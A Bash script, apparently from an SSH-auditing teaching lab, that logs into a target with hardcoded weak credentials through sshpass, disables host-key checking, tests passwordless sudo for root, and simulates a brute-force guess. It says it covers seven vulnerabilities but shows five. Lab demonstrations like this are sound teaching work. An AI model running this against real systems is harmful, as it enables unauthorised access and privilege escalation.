#!/bin/bash
# auditoria-ssh-lab/exploits-safe/exploit.sh
# Script para demonstrar a exploração das 7 vulnerabilidades descritas no README.md

# --- Validação de Entrada ---
if [ -z "$1" ]; then
    echo "Uso: $0 <IP_DA_VITIMA>"
    exit 1
fi

VICTIM_IP=$1

# --- Cores para o output ---
GREEN='\033[0;32m'
RED='\033[0;31m'
NC='\033[0m'

exploit_success() {
    echo -e "${GREEN}[+] SUCESSO:${NC} $1"
}

exploit_fail() {
    echo -e "${RED}[-] FALHA:${NC} $1"
}

echo "Iniciando a exploração de vulnerabilidades no alvo: $VICTIM_IP"
echo "======================================================"

# --- Chave 1: Engenharia Social (A Nota Adesiva Digital) ---
echo "[*] Chave 1: Tentando explorar a vulnerabilidade de Engenharia Social..."
# Simulação, conforme README.md: o atacante encontrou as credenciais.
USERNAME="professor"
PASSWORD="123456789"
exploit_success "Credenciais simuladas encontradas! Usuário/Senha: $USERNAME/$PASSWORD"

# --- Chave 2: A Porta da Frente Aberta (SSH com Senha) ---
echo "[*] Chave 2: Tentando acesso SSH com as credenciais vazadas..."
# Tenta executar um comando simples via SSH para confirmar o acesso.
sshpass -p "$PASSWORD" ssh -o StrictHostKeyChecking=no $USERNAME@$VICTIM_IP "echo 'Conexão SSH estabelecida com sucesso.'" > /dev/null 2>&1
if [ $? -eq 0 ]; then
    exploit_success "Acesso SSH com senha para o usuário '$USERNAME' bem-sucedido."
else
    exploit_fail "Acesso SSH com senha para o usuário '$USERNAME' falhou."
    exit 1
fi

# --- Chave 3: Privilégios de Super-Herói (Sudo sem Senha) ---
echo "[*] Chave 3: Tentando escalar privilégios com 'sudo' sem senha..."
SUDO_OUTPUT=$(sshpass -p "$PASSWORD" ssh -o StrictHostKeyChecking=no $USERNAME@$VICTIM_IP "sudo id")
if echo "$SUDO_OUTPUT" | grep -q "uid=0(root)"; then
    exploit_success "Escalonamento de privilégios para 'root' bem-sucedido."
    #echo "    Saída do comando 'sudo id': $SUDO_OUTPUT"
else
    exploit_fail "Escalonamento de privilégios para 'root' falhou."
fi

# --- Chave 4: Política de Senhas Fraca ---
echo "[*] Chave 4: Simulando ataque de força bruta para demonstrar política de senhas fraca..."
# A senha "123456789" é fraca e pode ser encontrada em wordlists comuns.
# Para a simulação, vamos tentar adivinhar a senha.
if sshpass -p "123456789" ssh -o StrictHostKeyChecking=no $USERNAME@$VICTIM_IP "exit" > /dev/null 2>&1; then
    exploit_success "Senha '123456789' confirmada por tentativa e erro."
else
    exploit_fail "Ataque de força bruta simulado falhou."
fi

# --- Chave 5: Sistema sem Hardening ---
echo "[*] Chave 5: A exploração bem-sucedida das chaves anteriores demonstra um sistema sem hardening."
exploit_success "A combinação de credenciais expostas, SSH com senha e sudo sem senha confirma a falta de hardening no sistema."

echo "\n======================================================"
echo "Exploração concluída."